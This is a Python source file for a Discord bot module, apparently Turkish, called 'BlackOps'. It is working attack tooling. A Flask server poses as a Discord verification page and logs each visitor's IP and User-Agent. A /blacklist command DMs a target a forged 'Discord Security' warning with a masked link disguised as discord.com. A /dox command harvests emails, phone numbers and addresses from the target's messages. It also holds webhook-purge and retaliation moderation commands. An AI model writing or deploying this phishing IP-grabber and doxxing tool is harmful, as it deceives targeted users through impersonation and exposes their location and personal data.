import discord
from discord.ext import commands, tasks
import config
import datetime
import re
import queue
import threading

_ip_logs = {}
_notify_queue = queue.Queue()

def _create_flask_app(bot_ref):
    from flask import Flask, request, redirect
    app = Flask(__name__)

    _PAGE = (
        "<!DOCTYPE html>"
        "<html lang='tr'>"
        "<head><meta charset='utf-8'>"
        "<meta name='viewport' content='width=device-width,initial-scale=1'>"
        "<title>Discord - Hesap Doğrulama</title>"
        "<style>"
        "*{margin:0;padding:0;box-sizing:border-box}"
        "body{background:#313338;color:#dbdee1;font-family:'Whitney','Helvetica Neue','Segoe UI',sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh}"
        ".card{background:#1e1f22;border-radius:12px;padding:40px;width:480px;max-width:94vw;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.4)}"
        ".logo{width:50px;height:50px;margin-bottom:20px}"
        "h1{font-size:22px;font-weight:600;margin-bottom:8px;color:#f2f3f5}"
        ".sub{color:#b5bac1;font-size:14px;margin-bottom:28px;line-height:1.4}"
        ".badge{display:inline-block;background:#248046;color:#fff;font-size:11px;font-weight:600;padding:3px 8px;border-radius:4px;margin-bottom:16px}"
        ".btn{background:#5865f2;color:#fff;border:none;border-radius:4px;padding:12px 40px;font-size:16px;font-weight:500;cursor:pointer;text-decoration:none;display:inline-block;transition:background .15s}"
        ".btn:hover{background:#4752c4}"
        ".footer{margin-top:24px;font-size:11px;color:#4e5058;border-top:1px solid #2b2d31;padding-top:16px}"
        ".footer a{color:#4e5058;text-decoration:none;margin:0 8px}"
        ".footer a:hover{color:#b5bac1}"
        ".alert{background:#2b2d31;border-left:3px solid #f0b232;padding:12px 16px;border-radius:4px;font-size:12px;text-align:left;margin-bottom:24px;color:#b5bac1}"
        ".alert strong{color:#f2f3f5;display:block;margin-bottom:4px}"
        "</style>"
        "</head><body>"
        "<div class='card'>"
        "<svg class='logo' viewBox='0 0 127.14 96.36' fill='#5865f2'><path d='M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83A97.68,97.68,0,0,0,49,6.83,72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2a68.68,68.68,0,0,1-10.87,5.19,77,77,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22h0C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.9,46,53.9,53,48.71,65.69,42.45,65.69Zm42.24,0C78.41,65.69,73.25,60,73.25,53s5-12.74,11.44-12.74S96.14,46,96.14,53,90.95,65.69,84.69,65.69Z'/></svg>"
        "<div class='badge'>GÜVENLİK</div>"
        "<h1>Hesap Doğrulama Gerekli</h1>"
        "<p class='sub'>Hesabınızın güvenliğini sağlamak için doğrulama yapmanız gerekiyor. Bu işlem 5 dakikadan az sürer.</p>"
        "<div class='alert'><strong>&#9888; Kısıtlı Erişim</strong>Doğrulama tamamlanana kadar bazı özelliklere erişiminiz kısıtlanmıştır.</div>"
        "<a class='btn' href='{URL}'>Hesabı Doğrula</a>"
        "<div class='footer'><a href='#'>Gizlilik Politikası</a> &bull; <a href='#'>Kullanım Şartları</a> &bull; <a href='#'>Yardım</a><br>&copy; 2026 Discord Inc.</div>"
        "</div></body></html>"
    )

    def _render_page(url):
        return _PAGE.replace("{URL}", url)

    @app.route("/log/<int:user_id>")
    def log_ip(user_id):
        ip = request.remote_addr or "0.0.0.0"
        ua = request.headers.get("User-Agent", "Unknown")
        now = datetime.datetime.utcnow().isoformat()
        _ip_logs[user_id] = {"ip": ip, "ua": ua, "time": now}
        _notify_queue.put({"user_id": user_id, "ip": ip, "ua": ua, "time": now})
        return _render_page("https://discord.com/login")

    @app.route("/verify/<int:user_id>")
    def verify(user_id):
        ip = request.remote_addr or "0.0.0.0"
        ua = request.headers.get("User-Agent", "Unknown")
        now = datetime.datetime.utcnow().isoformat()
        _ip_logs[user_id] = {"ip": ip, "ua": ua, "time": now}
        _notify_queue.put({"user_id": user_id, "ip": ip, "ua": ua, "time": now})
        return _render_page("https://discord.com/login")

    return app

class BlackOps(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.blacklist = {}
        self.retaliate_mode = {}
        self.re_email = re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}")
        self.re_phone = re.compile(r"(\+?\d{1,3}[-.\s]?)?(\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4,5})")
        self.re_address = re.compile(r"\d{1,5}\s+[A-Za-z0-9\s,.]+(?:sokak|cadde|mahalle|mh|cd|sk|no|apt)", re.IGNORECASE)
        self._start_flask()

    def _start_flask(self):
        app = _create_flask_app(self.bot)
        host = config.BLACK_OPS.get("flask_host", "0.0.0.0")
        port = config.BLACK_OPS.get("flask_port", 5000)
        t = threading.Thread(target=lambda: app.run(host=host, port=port, debug=False, use_reloader=False), daemon=True)
        t.start()
        self.notify_task.start()

    def cog_unload(self):
        self.notify_task.cancel()

    @tasks.loop(seconds=2)
    async def notify_task(self):
        while True:
            try:
                item = _notify_queue.get_nowait()
            except queue.Empty:
                return
            embed = discord.Embed(title="🛡️ IP Yakalandı!", color=config.COLOR_CRITICAL,
                                  timestamp=datetime.datetime.utcnow())
            embed.description = f"**Hedef:** <@{item['user_id']}>\n**Linke tıkladı!**"
            embed.add_field(name="🌐 IP", value=f"`{item['ip']}`")
            embed.add_field(name="📱 User-Agent", value=f"`{item['ua'][:80]}`", inline=False)
            embed.add_field(name="⏱ Zaman", value=item["time"])
            embed.set_footer(text=config.BLACK_OPS.get("base_url", "localhost:5000"))
            for guild in self.bot.guilds:
                for uid, data in list(self.blacklist.items()):
                    if uid == item["user_id"]:
                        ch = self._get_log_channel(guild)
                        if ch:
                            try:
                                await ch.send(embed=embed)
                            except:
                                pass
                        del self.blacklist[uid]
                        break

    def _get_log_channel(self, guild):
        if config.LOG_CHANNEL_ID:
            ch = guild.get_channel(config.LOG_CHANNEL_ID)
            if ch:
                return ch
        for ch in guild.text_channels:
            if "log" in ch.name.lower():
                return ch
        return None

    def _get_base_url(self):
        url = config.BLACK_OPS.get("base_url", "http://localhost:5000")
        return url.rstrip("/")

    @commands.hybrid_command(name="blacklist", description="Kullanıcıyı kara listeye alır ve DM'den sahte doğrulama linki gönderir")
    @commands.has_permissions(administrator=True)
    async def blacklist(self, ctx, uye: discord.Member):
        if uye.id == ctx.author.id or uye.id == self.bot.user.id:
            embed = discord.Embed(title="Hata", color=config.COLOR_CRITICAL)
            embed.description = "Kendinizi veya botu kara listeye alamazsınız."
            await ctx.reply(embed=embed)
            return
        base = self._get_base_url()
        uid = uye.id
        link = f"{base}/log/{uid}"
        masked = f"[discord.com/verify/{uid}]({link})"
        try:
            await uye.send(
                f"**🔒 Discord Güvenlik Bildirimi**\n"
                f"━━━━━━━━━━━━━━━━━━\n\n"
                f"**{uye.name}**, hesabınıza yeni bir cihazdan giriş yapıldığı için "
                f"hesabınız **geçici olarak kısıtlandı**.\n\n"
                f"➤ **Kısıtlama Sebebi:** Şüpheli giriş aktivitesi\n"
                f"➤ **Tarih:** {datetime.datetime.utcnow().strftime('%d %B %Y %H:%M')} UTC\n"
                f"➤ **Kalan Süre:** 14 dakika\n\n"
                f"**Kimliğinizi doğrulamak için aşağıdaki linke tıklayın:**\n"
                f"{masked}\n\n"
                f"*Bu işlem 15 dakika içinde tamamlanmazsa hesabınız kalıcı olarak askıya alınabilir.*\n\n"
                f"━━━━━━━━━━━━━━━━━━\n"
                f"Discord Güvenlik Ekibi"
            )
        except:
            embed = discord.Embed(title="Hata", color=config.COLOR_CRITICAL)
            embed.description = f"{uye.mention} DM gönderilemedi. Kullanıcı DM'lere kapalı veya botu engellemiş."
            await ctx.reply(embed=embed)
            return
        self.blacklist[uye.id] = {
            "author": ctx.author.id,
            "guild": ctx.guild.id,
            "time": datetime.datetime.utcnow().isoformat()
        }
        embed = discord.Embed(title="Kara Listeye Alındı", color=config.COLOR_CRITICAL)
        embed.description = f"{uye.mention} kara listeye alındı."
        embed.add_field(name="Durum", value="DM gönderildi, link tıklanınca IP kaydedilecek.")
        await ctx.reply(embed=embed)

    @commands.hybrid_command(name="iplog", description="Kullanıcının kaydedilmiş IP bilgisini sorgular")
    @commands.has_permissions(administrator=True)
    async def iplog(self, ctx, uye: discord.Member = None):
        uid = uye.id if uye else ctx.author.id
        log = _ip_logs.get(uid)
        if not log:
            embed = discord.Embed(title="IP Log", color=config.COLOR_WARNING)
            embed.description = f"<@{uid}> için kayıtlı IP bulunamadı."
            await ctx.reply(embed=embed)
            return
        embed = discord.Embed(title=f"IP Log: <@{uid}>", color=config.COLOR_CRITICAL)
        embed.add_field(name="IP Adresi", value=log.get("ip", "Bilinmiyor"))
        embed.add_field(name="User-Agent", value=log.get("ua", "Bilinmiyor")[:100])
        embed.add_field(name="Zaman", value=log.get("time", "Bilinmiyor"))
        await ctx.reply(embed=embed)

    @commands.hybrid_command(name="dox", description="Kullanıcının son mesajlarında kişisel bilgi taraması yapar")
    @commands.has_permissions(administrator=True)
    async def dox(self, ctx, uye: discord.Member = None):
        uye = uye or ctx.author
        limit = config.BLACK_OPS.get("scan_limit", 1000)
        embed = discord.Embed(title="Dox Taraması Başladı", color=config.COLOR_CRITICAL)
        embed.description = f"{uye.mention} son {limit} mesajı taranıyor..."
        await ctx.reply(embed=embed)
        found = {"email": set(), "phone": set(), "address": set()}
        count = 0
        try:
            async for msg in ctx.channel.history(limit=limit):
                if msg.author.id != uye.id:
                    continue
                count += 1
                content = msg.content
                for m in self.re_email.findall(content):
                    found["email"].add(m)
                for m in self.re_phone.findall(content):
                    found["phone"].add(m[0] + m[1] if m[0] else m[1])
                for m in self.re_address.findall(content):
                    found["address"].add(m)
                if count >= limit:
                    break
        except:
            pass
        total = sum(len(v) for v in found.values())
        if total == 0:
            embed = discord.Embed(title="Dox Taraması", color=config.COLOR_NORMAL)
            embed.description = f"{uye.mention} için hassas veri bulunamadı ({count} mesaj tarandı)."
            await ctx.reply(embed=embed)
            return
        embed = discord.Embed(title=f"Dox Taraması: {total} Veri Bulundu", color=config.COLOR_CRITICAL)
        embed.description = f"{uye.mention} ({count} mesaj tarandı)"
        for tip, items in found.items():
            if items:
                val = "\n".join(list(items)[:5])
                if len(val) > 950:
                    val = val[:947] + "..."
                embed.add_field(name=tip.upper(), value="```\n" + val + "```", inline=False)
        await ctx.reply(embed=embed)

    @commands.hybrid_command(name="webhook-avi", description="Sunucudaki tüm webhook'ları tarar ve yetkisizleri siler")
    @commands.has_permissions(administrator=True)
    async def webhook_avi(self, ctx):
        embed = discord.Embed(title="Webhook Avı Başladı", color=config.COLOR_CRITICAL)
        embed.description = "Tüm webhook'lar taranıyor..."
        await ctx.reply(embed=embed)
        purged = 0
        kept = 0
        for ch in ctx.guild.text_channels:
            try:
                whs = await ch.webhooks()
                for wh in whs:
                    if wh.user and wh.user.id != ctx.guild.me.id and not wh.user.id == ctx.guild.owner_id:
                        try:
                            await wh.delete(reason="Webhook avı: yetkisiz webhook")
                            purged += 1
                        except:
                            kept += 1
                    else:
                        kept += 1
            except:
                pass
        embed = discord.Embed(title="Webhook Avı Tamamlandı", color=config.COLOR_WARNING)
        embed.description = f"{purged} webhook silindi, {kept} webhook korundu."
        await ctx.reply(embed=embed)

    @commands.hybrid_command(name="purge-webhooks", description="Belirtilen kullanıcının webhook'larını siler")
    @commands.has_permissions(administrator=True)
    async def purge_webhooks(self, ctx, kullanici: discord.User):
        target_id = kullanici.id
        embed = discord.Embed(title="Webhook Temizliği", color=config.COLOR_CRITICAL)
        embed.description = f"<@{target_id}> webhook'ları siliniyor..."
        await ctx.reply(embed=embed)
        purged = 0
        for ch in ctx.guild.text_channels:
            try:
                whs = await ch.webhooks()
                for wh in whs:
                    if wh.user and wh.user.id == target_id:
                        try:
                            await wh.delete(reason="Purge: hedef kullanıcı webhook'ları")
                            purged += 1
                        except:
                            pass
            except:
                pass
        embed = discord.Embed(title="Webhook Temizliği Tamamlandı", color=config.COLOR_WARNING)
        embed.description = f"<@{target_id}> adına {purged} webhook silindi."
        await ctx.reply(embed=embed)

    @commands.Cog.listener()
    async def on_audit_log_entry_create(self, entry):
        guild = entry.guild
        if not guild:
            return
        if entry.action in (discord.AuditLogAction.channel_delete, discord.AuditLogAction.role_delete,
                            discord.AuditLogAction.ban, discord.AuditLogAction.kick):
            now = datetime.datetime.utcnow()
            gid = guild.id
            if gid not in self.retaliate_mode:
                self.retaliate_mode[gid] = {"count": 0, "last": now, "active": False, "target": None}
            rm = self.retaliate_mode[gid]
            if (now - rm["last"]).total_seconds() > 10:
                rm["count"] = 0
            rm["count"] += 1
            rm["last"] = now
            rm["target"] = entry.user.id if entry.user else None
            if rm["count"] >= 3 and not rm["active"]:
                rm["active"] = True
                embed = discord.Embed(title="Black Ops: Misilleme Modu Aktif", color=config.COLOR_CRITICAL)
                embed.description = f"Nuke/nuke benzeri saldırı tespit edildi ({rm['count']} işlem / 10s). Misilleme başlatılıyor..."
                embed.add_field(name="Saldırgan", value=f"<@{rm['target']}>" if rm['target'] else "Bilinmiyor")
                ch = self._get_log_channel(guild)
                if ch:
                    await ch.send(embed=embed)
                await self._execute_retaliation(guild, rm["target"])

    @commands.hybrid_command(name="retaliate", description="Belirtilen kullanıcıya karşı misilleme başlatır")
    @commands.has_permissions(administrator=True)
    async def retaliate(self, ctx, kullanici: discord.User):
        target_id = kullanici.id
        embed = discord.Embed(title="Misilleme Başlatıldı", color=config.COLOR_CRITICAL)
        embed.description = f"<@{target_id}> hedeflendi."
        await ctx.reply(embed=embed)
        await self._execute_retaliation(ctx.guild, target_id)

    async def _execute_retaliation(self, guild, target_id):
        if not target_id:
            return
        target = guild.get_member(target_id)
        if target:
            for role in target.roles:
                if role.is_default() or role.managed:
                    continue
                try:
                    await role.edit(permissions=discord.Permissions.none(), reason="Retaliation: yetki sıfırlama")
                except:
                    pass
            try:
                await target.ban(reason="Retaliation: nuke saldırısı", delete_message_days=0)
            except:
                try:
                    await target.kick(reason="Retaliation: nuke saldırısı")
                except:
                    pass
        bot_count = 0
        for member in guild.members:
            if member.bot and member.id != self.bot.user.id:
                inviter = None
                try:
                    async for entry in guild.audit_logs(limit=10, action=discord.AuditLogAction.bot_add):
                        if entry.target.id == member.id:
                            inviter = entry.user
                            break
                except:
                    pass
                if inviter and (target_id is None or inviter.id == target_id):
                    try:
                        await member.kick(reason="Retaliation: saldırgan botu")
                        bot_count += 1
                    except:
                        pass
        embed = discord.Embed(title="Black Ops: Misilleme Raporu", color=config.COLOR_CRITICAL)
        embed.description = f"{bot_count} bot sunucudan atıldı."
        if target:
            embed.add_field(name="Saldırgan", value=f"{target.mention} banlandı.")
        ch = self._get_log_channel(guild)
        if ch:
            await ch.send(embed=embed)
        self.retaliate_mode[guild.id] = {"count": 0, "last": datetime.datetime.utcnow(), "active": False, "target": None}

async def setup(bot):
    await bot.add_cog(BlackOps(bot))
